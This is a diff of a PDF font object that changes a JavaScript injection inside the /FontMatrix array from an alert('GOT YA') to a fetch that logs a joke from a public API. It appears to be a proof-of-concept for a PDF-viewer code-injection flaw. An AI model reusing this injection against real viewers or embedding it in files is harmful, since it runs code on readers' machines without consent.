@@ -46,7 +46,7 @@ endobj
   /BaseFont /SNCSTG+CMBX12
   /FontDescriptor 7 0 R
   /Subtype /Type1
-  /FontMatrix [1 2 3 4 5 (1\); alert\('!!!GOT YA!!!')]
+  /FontMatrix [1 2 3 4 5 (1\); fetch\('https://icanhazdadjoke.com/', { headers: {'Accept': 'application/json'}}\).then\(res=>res.json\(\).then\(data=>console.log\(data.joke\)\))]
   /Type /Font
 >>
 endobj
